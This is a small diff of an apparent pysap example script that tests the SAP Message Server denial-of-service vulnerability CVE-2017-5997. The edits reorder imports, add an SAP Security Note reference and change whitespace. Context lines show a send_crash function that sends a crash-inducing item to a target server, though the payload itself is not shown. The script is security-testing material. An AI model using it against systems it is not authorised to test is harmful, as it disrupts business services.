@@ -62,9 +62,9 @@ from time import sleep
 from socket import error as SocketError
 from optparse import OptionParser, OptionGroup
 # External imports
-from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop
-from scapy.config import conf
 import pysap
+from scapy.config import conf
+from pysap.SAPRouter import SAPRoutedStreamSocket
 
 # Set the verbosity to 0
 conf.verb = 0
@@ -75,7 +75,8 @@ def parse_options():
 
     description = "This example script can be used to tests against CVE-2017-5997 Denial of Service vulnerability" \
                   "affecting the Message Server. For more details about the vulnerability see Advisory " \
-                  "https://erpscan.com/advisories/erpscan-16-038-sap-message-server-http-remote-dos/."
+                  "https://erpscan.com/advisories/erpscan-16-038-sap-message-server-http-remote-dos/ and SAP " \
+                  "Security Note 2358972 (https://launchpad.support.sap.com/#/notes/2358972)"
 
     epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
                                                          "url": pysap.__url__,
@@ -114,6 +115,7 @@ def parse_options():
 
     return options
 
+
 def send_crash(host, port, item, verbose, route=None):
     # Create the connection to the SAP Netweaver server
     if verbose:
@@ -122,6 +124,7 @@ def send_crash(host, port, item, verbose, route=None):
     conn = SAPRoutedStreamSocket.get_nisocket(host, port, route, talk_mode=1)
     conn.send(item)
     conn.close()
+
 
 # Main function
 def main():
